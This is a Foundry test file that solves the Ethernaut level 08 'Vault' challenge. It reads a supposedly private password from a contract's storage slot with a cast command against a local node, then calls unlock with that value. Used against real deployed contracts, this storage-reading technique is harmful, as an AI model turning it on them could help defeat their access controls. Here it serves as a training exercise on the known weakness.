// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/08_Vault.sol";

/*
Author: @BoscoHuang


Command:
- get the password: cast storage 0x5FbDB2315678afecb367f032d93F642f64180aa3 1 --rpc-url http://127.0.0.1:8545
- forge test --match-contract VaultTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract VaultTest is DSTest {
    Vault Ethernaut08;

    function setUp() public {
        Ethernaut08 = Vault(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    }

    function testEthernaut08() public {
        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;

        Ethernaut08.unlock(password);
        assert(Ethernaut08.locked() == false);
        console.log("Unlocked Vault");
    }

}